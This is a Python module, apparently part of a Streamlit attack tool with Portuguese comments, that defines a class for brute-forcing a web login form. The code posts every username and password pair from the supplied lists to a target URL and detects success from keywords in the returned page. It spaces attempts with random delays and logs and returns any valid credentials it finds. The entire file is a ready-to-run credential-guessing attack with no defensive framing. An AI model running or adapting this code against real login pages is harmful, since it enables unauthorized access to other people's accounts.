import time
import random
import streamlit as st
from config import log_result, get_log_filename
from datetime import datetime, timedelta

class BruteForceAttack:
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.valid_credentials = []

    def run(self, target_url, usernames, passwords, log_file=None, max_attempts=100, delay=1.0, 
            live_log_container=None, progress_container=None):
        """
        Executa o ataque de brute force com logs em tempo real.
        """
        if log_file is None:
            log_file = get_log_filename()

        # Lista para logs em tempo real
        live_logs = []
        
        # Extrair componentes do progress_container
        progress_bar = None
        status_text = None
        if progress_container:
            progress_bar, status_text = progress_container

        def add_log(message, update_progress=None):
            """Função para adicionar log e atualizar interface em tempo real"""
            brazil_time = datetime.now() - timedelta(hours=3) 
            timestamp = brazil_time.strftime("%H:%M:%S")
            formatted_log = f"[{timestamp}] {message}"
            live_logs.append(formatted_log)
            
            # Salvar no arquivo
            log_result(message, log_file)
            
            # Atualizar logs em tempo real
            if live_log_container:
                display_logs = live_logs[-15:] if len(live_logs) > 15 else live_logs
                live_log_container.text_area(
                    f"📋 Logs em Tempo Real ({len(live_logs)} total):", 
                    value="\n".join(display_logs),
                    height=300,
                    key=f"live_logs_{len(live_logs)}"
                )
            
            # Atualizar progresso
            if progress_bar and update_progress is not None:
                progress_bar.progress(update_progress)
            
            if status_text:
                status_text.text(f"🔄 {message}")

        add_log("🚀 Iniciando ataque de Brute Force...", 0)
        
        attempts = 0
        found = False
        total_combinations = min(len(usernames) * len(passwords), max_attempts)

        for i, username in enumerate(usernames):
            for j, password in enumerate(passwords):
                if attempts >= max_attempts:
                    add_log(f"⚠️ Limite de {max_attempts} tentativas atingido.")
                    break

                attempts += 1
                progress_percent = int((attempts / total_combinations) * 90)  # Deixa 10% para finalização
                
                add_log(f"🔍 Tentativa {attempts}/{total_combinations}: {username}:{password}", progress_percent)

                data = {
                    "Usuario": "Login",
                    "Login": username,
                    "Senha": password
                }

                try:
                    response = self.session_manager.session.post(target_url, data=data, allow_redirects=True)

                    success_indicators = ["Bem-vindo", "Home", "Dashboard", "welcome", "success"]
                    if any(indicator.lower() in response.text.lower() for indicator in success_indicators):
                        add_log(f"✅ SUCESSO! Credenciais válidas: {username}:{password}")
                        self.valid_credentials.append((username, password))
                        found = True
                    else:
                        add_log(f"❌ Falha: {username}:{password} (Status: {response.status_code})")

                except Exception as e:
                    add_log(f"🔥 Erro na tentativa: {str(e)}")

                # Delay com feedback visual
                sleep_time = random.uniform(delay / 2, delay * 1.5)
                add_log(f"⏱️ Aguardando {sleep_time:.1f}s...")
                
                # Sleep em pequenos incrementos para manter responsividade
                sleep_steps = 10
                for step in range(sleep_steps):
                    time.sleep(sleep_time / sleep_steps)
                    # Pequena atualização visual durante o sleep
                    if live_log_container and step == sleep_steps // 2:
                        pass  # Pode adicionar algum feedback visual aqui

            if found and attempts >= max_attempts:
                break

        # Finalização
        add_log("🔄 Processando resultados finais...", 95)
        
        if self.valid_credentials:
            result = f"🏆 SUCESSO! Credenciais válidas encontradas: {self.valid_credentials}"
            add_log(result)
        else:
            result = f"😔 Nenhuma credencial válida encontrada após {attempts} tentativas."
            add_log(result)

        add_log("�� Ataque de Brute Force finalizado!", 100)
        
        # Pequena pausa para mostrar finalização
        time.sleep(1)
        
        return result